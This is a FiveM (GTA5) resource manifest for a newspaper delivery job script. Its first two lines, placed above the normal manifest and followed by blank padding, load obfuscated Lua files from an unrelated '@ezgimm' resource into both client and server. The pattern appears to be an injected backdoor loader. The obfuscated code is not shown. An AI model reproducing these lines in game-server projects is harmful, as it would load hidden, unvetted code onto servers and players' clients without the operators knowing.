shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
-- ERDEM & MUSTAFA




 
 
fx_version 'cerulean'
game 'gta5'

author 'qb'
description 'Newspaper Delivery.'

shared_scripts { 'shared.lua', '@ox_lib/init.lua', }

client_scripts { 'bridge/client/**.lua', 'cl_delivery.lua' }

server_scripts { 'bridge/server/**.lua', 'sv_delivery.lua'}
escrow_ignore {
	'shared.lua',
	'sv_config.lua'
}

lua54 'yes'


dependency '/assetpacks'